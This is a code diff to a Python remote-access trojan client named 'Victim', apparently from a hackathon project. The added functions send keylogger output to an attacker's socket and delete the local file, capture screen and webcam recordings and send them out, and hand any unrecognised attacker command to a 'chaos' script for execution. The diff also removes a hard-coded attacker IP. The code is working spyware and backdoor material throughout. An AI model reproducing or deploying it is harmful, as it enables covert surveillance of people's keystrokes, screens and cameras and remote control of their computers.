@@ -5,7 +5,7 @@ import os
 
 class Victim():
     def __init__(self):
-        self.host = "18.216.151.152"
+        self.host = ""
         self.port = 5588
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -25,6 +25,48 @@ class Victim():
         except:
             pass
 
+    def get_keylogger(self):
+        current_directory = os.getcwd()
+        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/KeyLogger")
+        file = open("keylogger.txt", "rb")
+        data = file.read()
+        file.close()
+        os.remove("keylogger.txt")
+        self.sock.send(data)
+        os.chdir(current_directory)
+
+    def get_screen_recording(self):
+        current_directory = os.getcwd()
+        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/ImgLogger")
+        total_seconds = self.sock.recv(1024).decode()
+        process = subprocess.Popen(["python3", "imglogger.py", total_seconds], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        process.wait()
+        file = open("screenrecord.mp4", "rb")
+        data = file.read()
+        file.close()
+        self.sock.send(data)
+        os.chdir(current_directory)
+
+    def get_camera_recording(self):
+        current_directory = os.getcwd()
+        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/ImgLogger")
+        total_seconds = self.sock.recv(1024).decode()
+        process = subprocess.Popen(["python3", "camlogger.py", total_seconds], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        process.wait()
+        file = open("CamRecording.mp4", "rb")
+        data = file.read()
+        file.close()
+        self.sock.send(data)
+        os.chdir(current_directory)
+
+    def chaos(self):
+        current_directory = os.getcwd()
+        os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/Chaos")
+        command = self.sock.recv(1024).decode()
+        args = command.split(" ")
+        subprocess.Popen(["python3", "chaos.py"] + args)
+        os.chdir(current_directory)
+    
     def file_system(self):
         while True:
             try:
@@ -85,10 +127,16 @@ if __name__ == "__main__":
         victim.connect_to_attacker()
         while True:
             command = victim.sock.recv(1024).decode()
-            if command == "Get keylogger.txt":
-                pass
+            if command == "Get keylogger":
+                victim.get_keylogger()
+            elif command == "Get screen recording":
+                victim.get_screen_recording()
+            elif command == "Get camera recording":
+                victim.get_camera_recording()
             elif command == "File system":
                 victim.file_system()
             elif command == "Disconnect":
                 break
+            else:
+                victim.chaos()
         victim.disconnect_from_attacker()
